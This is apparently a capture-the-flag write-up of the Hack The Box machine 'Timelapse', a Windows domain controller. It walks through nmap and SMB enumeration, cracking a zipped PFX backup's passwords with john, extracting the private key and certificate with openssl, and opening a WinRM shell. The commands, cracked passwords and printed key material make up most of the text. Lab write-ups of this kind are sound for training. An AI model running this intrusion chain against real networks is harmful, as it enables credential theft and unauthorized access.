#windows
# Enumeration

## Nmap
```
nmap -sC -sV -Pn timelapse.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 06:18 EST
Nmap scan report for timelapse.htb (10.129.227.113)
Host is up (0.19s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-02-16 19:18:21Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-16T19:18:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.02 seconds
```

### Full quick scan
```
nmap -Pn  -p- --min-rate 10000 timelapse.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 23:20 EST
Nmap scan report for timelapse.htb (10.129.227.113)
Host is up (0.18s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
57179/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 35.80 seconds
```

### Detailed scan for specific ports
```
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,62656 -sC -sV -Pn timelapse.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 23:45 EST
Nmap scan report for timelapse.htb (10.129.227.113)
Host is up (0.18s latency).

PORT      STATE    SERVICE           VERSION
53/tcp    open     domain            Simple DNS Plus
88/tcp    open     kerberos-sec      Microsoft Windows Kerberos (server time: 2023-02-17 12:45:16Z)
135/tcp   open     msrpc             Microsoft Windows RPC
139/tcp   open     netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open     ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ldapssl?
3268/tcp  open     ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open     globalcatLDAPssl?
5986/tcp  open     ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-02-17T12:46:48+00:00; +8h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
9389/tcp  open     mc-nmf            .NET Message Framing
49667/tcp open     msrpc             Microsoft Windows RPC
49673/tcp open     ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc             Microsoft Windows RPC
49696/tcp open     msrpc             Microsoft Windows RPC
62656/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-17T12:46:08
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.15 seconds
```


## Domain controller
Kerberos+LDAP+DNS+SMB -> Domaincontroller?

## Check ports

### Simple DNS Plus port 53 tcp

### Microsoft Windows Kerberos port 88 tcp

### Microsoft Windows RPC port 135 tcp

### Microsoft Windows netbios-ssn port 139 tcp

### SMB port 445 tcp
```
crackmapexec smb timelapse.htb
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing RDP protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

```
crackmapexec smb timelapse.htb --shares
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         timelapse.htb   445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
                                     
```

```
smbclient -L //timelapse.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to timelapse.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
crackmapexec smb timelapse.htb --shares -u tofu -p ''
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         timelapse.htb   445    DC01             [+] timelapse.htb\tofu: 
SMB         timelapse.htb   445    DC01             [+] Enumerated shares
SMB         timelapse.htb   445    DC01             Share           Permissions     Remark
SMB         timelapse.htb   445    DC01             -----           -----------     ------
SMB         timelapse.htb   445    DC01             ADMIN$                          Remote Admin
SMB         timelapse.htb   445    DC01             C$                              Default share
SMB         timelapse.htb   445    DC01             IPC$            READ            Remote IPC
SMB         timelapse.htb   445    DC01             NETLOGON                        Logon server share 
SMB         timelapse.htb   445    DC01             Shares          READ            
SMB         timelapse.htb   445    DC01             SYSVOL                          Logon server share 
```

#### IPC$

```
smbclient -N //timelapse.htb/IPC$  
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

#### Shares
```
smbclient -N //timelapse.htb/Shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1332787 blocks available
```

```
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
```

```
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1332787 blocks available

```

```
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
```

#### LAPS

### port 464

### Microsoft Windows RPC over HTTP 1.0 port 593 tcp

### port 636

### Microsoft Windows Active Directory LDAP port 389, 3268 tcp

### port 3269



# Foothold

## Open winrm zip

### Create hash
```
zip2john winrm_backup.zip > winrm_zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

### john to crack password
```
john --wordlist=/usr/share/wordlists/rockyou.txt winrm_zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-02-17 03:02) 3.030g/s 10513Kp/s 10513Kc/s 10513KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

supremelegacy is the password

## pfx file

Use openssl to create pfx file?? so we can also extract private key and certificate from `.pfx` file.
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Mac verify error: invalid password?

```


### john again

`pfx2john legacyy_dev_auth.pfx > legacyy.pfx.hash`

```
john --wordlist=/usr/share/wordlists/rockyou.txt legacyy.pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:52 DONE (2023-02-17 03:13) 0.01898g/s 61348p/s 61348c/s 61348C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### pfx
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```
PEM pass: tofu

### Encrypted key
```
cat legacyy_dev_auth.key                                                  
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQI4hiCbXC5bB4CAggA
MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBB6tlXiuVBav2DZmJF5C1lpBIIE
0KKqL1dx1hb6Fkq6shY0ONhqnN/iEmbj55Rmm7vaTTP0CPyt+4RxEvhNZwaOcuRX
LExzmKY15nJfSxk0jVxpmNtE8nO3hZmibHAQDN6q10l6ru6yUyJxw71U/8oqh7Y/
2xtlX6ukITakEC7wJ0Tbowu4VSjcnu6Ohb2zhtOfP66o09RNPRuG8VRH6fbD9jKb
p2+Dh27z+bIbCooXPcSMsZAIOk6JnEgX5PhYOsM8GchHfhZZgL/VtzTg2Rm6yF68
oHqLhz1r21lLAYf7uHhRZP9fCyFLe14qPNcVGebAbQ+evs7EkcTYmgMt6jO0uLBK
NBO1K8Wmqr05PMRaPyV0qCWK8ws1ySLo4Nz/pOrinECpA1c6ybtKeesSHgaWmdkB
zTWfBMalGCZqfhdlz6/tQELOHJYaSLEyvCQnTcdCl38T+56CRHfqFBZYriK2vXat
VXt/hSs1V1tJdFGm+MrpWqj8sbqrKGNCrXf7eppOFSQ86N4SaIv7vwUM32n92g2Y
FZcxOzf95290VuzKLB9zehZ06eKkEyCnBVlWA3U3vFGoCjo1zcq187ADcJZ5r46K
CDVoQJHYDG0jpi+4GVqS6wBL1IT5IukzcgGP0BB0QpSeC9if2WC/3ocE7H6uTrzj
oH7oaHNtNKjiToCm0xY2J+WzU+F39VlFHlxQYB215HGiOdyCeS3spEwaa38+ZuF3
hr8WZIM9+NptiSZ7o70wspazietOI8vJRP38urzDx0F7+f3rLcyHAm83ni0pQOei
T3FXY9EP4toCLKF2FF4XLO6N5lKqc8qChLi96LuD2E0WNvyHDAma1eagpc3dI4lA
1S2iyRwRgkdFqLCOO1V1q8erM2qLHjq5zzaTvTbVhnc+XoQKq3/HvG6QGqXkN0e0
OW1r932gnFtJkmgm3Pn48MUv4pq+TqaKZiep9fzrLf62WaIx7s9WX+OrSQ52SIg6
fzIvwX/3sUnKvItYI9f6W0PHwkL8qLa5iBPwLoKFpFs8nCKqVZXUh6xeD6M0zvwE
UkQCAmOIRrqbqJ2fnmO76K0SopWRyqJzA7/8ifA8MQFKu/inXOG5BGW5aYxIO5WF
F06fXJnIJ2i6J3xt5XymHvcjnzYav8T+gBIEzCHNncikGXnQvTK1ItgR6C5J0mLc
4aR8HiIb0tsORMVQ/Z+Q8MSj+cZfMjOpY3DjsnNpHULZE815e7X/neXmb4a1ifO1
RfdhxA+wkfPmzaUze4JKNIFsQvXr+w917vgk+DFn9Ogzo8rW8pRN7iHhYOCrsLqv
OTw3i+9J/b1p+1E9CT4WI5O1jCtMDk6CtvrmbQQaw52svufrcO8Y7NQ+egrYBvIU
p8HNL1HIp74rvAxnhY8n3TaoVzPSE+pdHpduepNXPjFEvaR+1GeYHmIInxC8aHcm
oNpZaLzsykegHvTrAGUqHqiLtjrHTsU2ss9j2dU0YNarLCMEfh+HNrupKsacbLiO
9tpTZd6N96rzGOYTClZpxRWlNwVHPwh4o8hG/WKzyoOEKsv+sk5s1vcD1lOAGFAQ
/Cwnq8FHJIWQTBAVG4IQQ+nbi7XiGGs7Raz8u9lwHiUC2LUWa8VzLC+aRuFbIMVY
mQqHJRu7r9OJUjpQw0+LYJYVJtSxgyYnBiV3erIWAAQJ
-----END ENCRYPTED PRIVATE KEY-----
```

```
openssl rsa -in legacyy_dev_auth.key -out legacyy_dec.key
Enter pass phrase for legacyy_dev_auth.key:
writing RSA key
```
pass phrase: tofu

```
cat legacyy_dec.key     
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----
```


### Certificate
```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
Enter Import Password:
```
pass: thuglegacy

```
cat legacyy.crt    
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = Legacyy
issuer=CN = Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```


## Evil-winrm

```
evil-winrm -i timelapse.htb -S -k legacyy_dec.key -c legacyy.crt         


Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                   

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

### User flag

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
```


# Privilege Escalation
## Enumeration

